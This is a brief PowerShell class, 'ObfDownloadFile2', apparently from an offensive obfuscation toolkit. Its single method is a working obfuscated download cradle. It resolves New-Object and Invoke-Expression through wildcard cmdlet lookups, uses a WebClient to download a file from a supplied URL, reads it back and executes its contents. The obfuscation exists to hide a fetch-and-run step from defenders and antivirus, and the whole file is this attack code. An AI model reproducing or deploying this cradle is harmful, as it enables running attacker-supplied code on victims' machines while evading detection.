Class ObfDownloadFile2 {

    static Execute ([String]$url, [String]$path) {
        Set-Item Variable:\FV $path;SI Variable:/8IU 'Net.WebClient';SV g80 $url;pushd;SV uE7 (&$ExecutionContext.InvokeCommand.GetCmdlets('*w-*ct')(Variable 8IU).Value);SV I ((((Variable uE7).Value|Member)|?{$_.Name-ilike'Do*e'}).Name);(Variable uE7).Value.(Variable I -Valu).Invoke((Get-Variable g80).Value,(GV FV).Value);(([Text.Encoding]::ASCII.GetString((GC (GV FV).Value -Encodi 3)))-Join'')|.$ExecutionContext.InvokeCommand.GetCmdlets('*e-*press*')
    }

}